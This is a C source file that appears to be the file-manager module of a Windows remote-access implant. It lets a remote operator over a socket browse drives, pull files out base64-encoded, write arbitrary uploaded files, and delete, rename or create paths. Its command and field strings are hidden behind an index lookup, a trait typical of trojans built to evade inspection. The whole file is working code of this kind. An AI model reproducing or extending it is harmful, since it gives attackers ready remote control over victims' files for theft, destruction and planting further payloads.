#include "filebrowser.h"
#include <stdio.h>
#include <io.h>
#include <direct.h>
#include <sys/stat.h>
#include "cJSON.h"
#include "utils.h"

#define MAX_DOWNLOAD_BYTES (50 * 1024 * 1024)

static void fb_error(SOCKET sock, HANDLE mutex, const char* prefix, const char* msg) {
    cJSON* root = cJSON_CreateObject(); cJSON_AddStringToObject(root, s(SI_FB_ERROR), msg);
    char* json_str = cJSON_PrintUnformatted(root); char* buf = malloc(strlen(json_str) + strlen(prefix) + 1); sprintf(buf, "%s%s", prefix, json_str);
    sock_send(sock, mutex, buf); free(buf); free(json_str); cJSON_Delete(root);
}

void handle_ls(SOCKET sock, HANDLE mutex, const char* path) {
    if (strlen(path) == 0) {
        cJSON* root = cJSON_CreateObject(); cJSON_AddStringToObject(root, s(SI_FB_PATH), ""); cJSON_AddStringToObject(root, s(SI_FB_SEP), s(SI_FB_SEP));
        cJSON* items = cJSON_CreateArray(); DWORD drives = GetLogicalDrives();
        for (int i = 0; i < 26; i++) { if (drives & (1 << i)) {
            char d[5]; sprintf(d, "%c:\\", 'A' + i); cJSON* item = cJSON_CreateObject(); cJSON_AddStringToObject(item, s(SI_FB_NAME), d);
            cJSON_AddStringToObject(item, s(SI_FB_TYPE), s(SI_FB_DRIVE)); cJSON_AddNumberToObject(item, s(SI_FB_SIZE), 0); cJSON_AddStringToObject(item, s(SI_FB_MTIME), ""); cJSON_AddItemToArray(items, item);
        } }
        cJSON_AddItemToObject(root, s(SI_FB_ITEMS), items); char* json_str = cJSON_PrintUnformatted(root); char* buf = malloc(strlen(json_str) + 32); sprintf(buf, "%s%s", s(SI_LS_RES), json_str);
        sock_send(sock, mutex, buf); free(buf); free(json_str); cJSON_Delete(root); return;
    }
    char search_path[MAX_PATH]; sprintf(search_path, "%s\\*", path); WIN32_FIND_DATAA ffd; HANDLE hFind = FindFirstFileA(search_path, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) { fb_error(sock, mutex, s(SI_LS_RES), s(SI_FB_DENIED)); return; }
    cJSON* root = cJSON_CreateObject(); cJSON_AddStringToObject(root, s(SI_FB_PATH), path); cJSON_AddStringToObject(root, s(SI_FB_SEP), s(SI_FB_SEP)); cJSON* items = cJSON_CreateArray();
    do { if (strcmp(ffd.cFileName, ".") == 0 || strcmp(ffd.cFileName, "..") == 0) continue;
        cJSON* item = cJSON_CreateObject(); cJSON_AddStringToObject(item, s(SI_FB_NAME), ffd.cFileName); int is_dir = (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY);
        cJSON_AddStringToObject(item, s(SI_FB_TYPE), is_dir ? s(SI_FB_DIR) : s(SI_FB_FILE)); unsigned long long size = ((unsigned long long)ffd.nFileSizeHigh << 32) | ffd.nFileSizeLow;
        cJSON_AddNumberToObject(item, s(SI_FB_SIZE), is_dir ? 0 : (double)size); FILETIME ft = ffd.ftLastWriteTime; SYSTEMTIME st; FileTimeToSystemTime(&ft, &st);
        char mtime[32]; sprintf(mtime, "%02d.%02d.%d %02d:%02d", st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute); cJSON_AddStringToObject(item, s(SI_FB_MTIME), mtime);
        cJSON_AddItemToArray(items, item); } while (FindNextFileA(hFind, &ffd));
    FindClose(hFind); cJSON_AddItemToObject(root, s(SI_FB_ITEMS), items); char* json_str = cJSON_PrintUnformatted(root); char* buf = malloc(strlen(json_str) + 32); sprintf(buf, "%s%s", s(SI_LS_RES), json_str);
    sock_send(sock, mutex, buf); free(buf); free(json_str); cJSON_Delete(root);
}

void handle_download(SOCKET sock, HANDLE mutex, const char* path) {
    FILE* f = fopen(path, "rb"); if (!f) { fb_error(sock, mutex, s(SI_DOWNLOAD), s(SI_FB_CANNOT_OPEN)); return; }
    fseek(f, 0, SEEK_END); long size = ftell(f); fseek(f, 0, SEEK_SET);
    if (size > MAX_DOWNLOAD_BYTES) { fclose(f); char buf[128]; sprintf(buf, "File too large (%ld MB > 50 MB)", size / 1024 / 1024); fb_error(sock, mutex, s(SI_DOWNLOAD), buf); return; }
    unsigned char* data = malloc(size); fread(data, 1, size, f); fclose(f); size_t b64_len; char* b64 = base64_encode(data, (int)size, &b64_len); free(data);
    char* name = strrchr(path, '\\'); if (name) name++; else name = (char*)path;
    cJSON* root = cJSON_CreateObject(); cJSON_AddStringToObject(root, "name", name); cJSON_AddStringToObject(root, "data", b64); cJSON_AddNumberToObject(root, "size", (double)size);
    char* json_str = cJSON_PrintUnformatted(root); char* buf = malloc(strlen(json_str) + 32); sprintf(buf, "%s%s", s(SI_DOWNLOAD), json_str);
    sock_send(sock, mutex, buf); free(buf); free(json_str); free(b64); cJSON_Delete(root);
}

void handle_delete(SOCKET sock, HANDLE mutex, const char* path) {
    DWORD attr = GetFileAttributesA(path); int ok = 0; if (attr != INVALID_FILE_ATTRIBUTES) { if (attr & FILE_ATTRIBUTE_DIRECTORY) ok = RemoveDirectoryA(path); else ok = DeleteFileA(path); }
    cJSON* root = cJSON_CreateObject(); if (ok) { cJSON_AddBoolToObject(root, "ok", 1); cJSON_AddStringToObject(root, "path", path); } else cJSON_AddStringToObject(root, s(SI_FB_ERROR), s(SI_FB_CANNOT_DEL));
    char* json_str = cJSON_PrintUnformatted(root); char* buf = malloc(strlen(json_str) + 32); sprintf(buf, "%s%s", s(SI_DELETE), json_str);
    sock_send(sock, mutex, buf); free(buf); free(json_str); cJSON_Delete(root);
}

void handle_mkdir(SOCKET sock, HANDLE mutex, const char* path) {
    int ok = _mkdir(path) == 0; cJSON* root = cJSON_CreateObject(); if (ok) { cJSON_AddBoolToObject(root, "ok", 1); cJSON_AddStringToObject(root, "path", path); } else cJSON_AddStringToObject(root, s(SI_FB_ERROR), "mkdir failed");
    char* json_str = cJSON_PrintUnformatted(root); char* buf = malloc(strlen(json_str) + 32); sprintf(buf, "%s%s", s(SI_MKDIR), json_str);
    sock_send(sock, mutex, buf); free(buf); free(json_str); cJSON_Delete(root);
}

void handle_upload(SOCKET sock, HANDLE mutex, const char* payload) {
    const char* sep = strchr(payload, '|'); if (!sep) { fb_error(sock, mutex, s(SI_UPLOAD), "Invalid payload"); return; }
    int path_len = (int)(sep - payload); char* path = malloc(path_len + 1); strncpy(path, payload, path_len); path[path_len] = 0; const char* b64 = sep + 1;
    size_t data_len; unsigned char* data = base64_decode(b64, (int)strlen(b64), &data_len); if (!data) { fb_error(sock, mutex, s(SI_UPLOAD), "Base64 decode error"); free(path); return; }
    FILE* f = fopen(path, "wb"); if (!f) { fb_error(sock, mutex, s(SI_UPLOAD), s(SI_FB_CANNOT_OPEN)); free(path); free(data); return; }
    fwrite(data, 1, data_len, f); fclose(f); cJSON* root = cJSON_CreateObject(); cJSON_AddBoolToObject(root, "ok", 1); cJSON_AddStringToObject(root, "path", path); cJSON_AddNumberToObject(root, "size", (double)data_len);
    char* json_str = cJSON_PrintUnformatted(root); char* buf = malloc(strlen(json_str) + 32); sprintf(buf, "%s%s", s(SI_UPLOAD), json_str);
    sock_send(sock, mutex, buf); free(buf); free(json_str); free(path); free(data); cJSON_Delete(root);
}

void handle_rename(SOCKET sock, HANDLE mutex, const char* payload) {
    const char* sep = strchr(payload, '|'); if (!sep) { fb_error(sock, mutex, s(SI_RENAME), "Invalid payload"); return; }
    int old_len = (int)(sep - payload); char* old_path = malloc(old_len + 1); strncpy(old_path, payload, old_len); old_path[old_len] = 0; const char* new_path = sep + 1;
    int ok = rename(old_path, new_path) == 0; cJSON* root = cJSON_CreateObject(); if (ok) { cJSON_AddBoolToObject(root, "ok", 1); cJSON_AddStringToObject(root, "old", old_path); cJSON_AddStringToObject(root, "new", new_path); } else cJSON_AddStringToObject(root, s(SI_FB_ERROR), "rename failed");
    char* json_str = cJSON_PrintUnformatted(root); char* buf = malloc(strlen(json_str) + 32); sprintf(buf, "%s%s", s(SI_RENAME), json_str);
    sock_send(sock, mutex, buf); free(buf); free(json_str); free(old_path); cJSON_Delete(root);
}
